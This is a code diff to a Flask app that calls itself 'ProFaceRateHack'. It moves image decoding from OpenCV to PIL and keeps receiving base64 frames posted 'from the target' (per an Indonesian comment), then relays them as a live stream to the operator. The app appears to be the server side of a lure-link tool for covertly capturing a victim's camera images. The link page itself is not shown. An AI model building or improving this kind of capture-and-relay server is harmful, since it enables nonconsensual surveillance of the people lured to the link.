@@ -1,7 +1,7 @@
 from flask import Flask, render_template, request, Response
 import base64
-import cv2
-import numpy as np
+from PIL import Image
+import io
 import threading
 import time
 
@@ -18,31 +18,36 @@ def target():
 def stream():
     global latest_frame
     try:
+        # Ambil base64 dari target
         img_b64 = request.json['image'].split(',')[1]
         img_data = base64.b64decode(img_b64)
-        nparr = np.frombuffer(img_data, np.uint8)
-        frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
-        if frame is not None:
-            frame = cv2.resize(frame, (640, 480))
-            with lock:
-                latest_frame = frame.copy()
-    except: pass
-    return {"status": "live"}
+        
+        # Buka dengan PIL (bukan cv2)
+        img = Image.open(io.BytesIO(img_data)).convert('RGB')
+        img = img.resize((640, 480))
+        
+        # Encode ulang jadi JPEG base64
+        buffered = io.BytesIO()
+        img.save(buffered, format="JPEG", quality=70)
+        b64_jpg = base64.b64encode(buffered.getvalue()).decode()
+        
+        with lock:
+            latest_frame = b64_jpg
+            
+    except Exception as e:
+        print("Error:", e)
+    return {"status": "ok"}
 
 @app.route('/live')
 def live():
     def gen():
         while True:
             with lock:
-                if latest_frame is not None:
-                    _, buf = cv2.imencode('.jpg', latest_frame, [int(cv2.IMWRITE_JPEG_QUALITY), 70])
-                    yield f"data: {base64.b64encode(buf).decode()}\n\n"
+                if latest_frame:
+                    yield f"data: {latest_frame}\n\n"
             time.sleep(0.1)
     return Response(gen(), mimetype='text/event-stream')
 
 @app.route('/')
 def home():
     return "<h2>ProFaceRateHack ACTIVE</h2><a href='/target'>Target Link</a>"
-
-if __name__ == '__main__':
-    app.run()
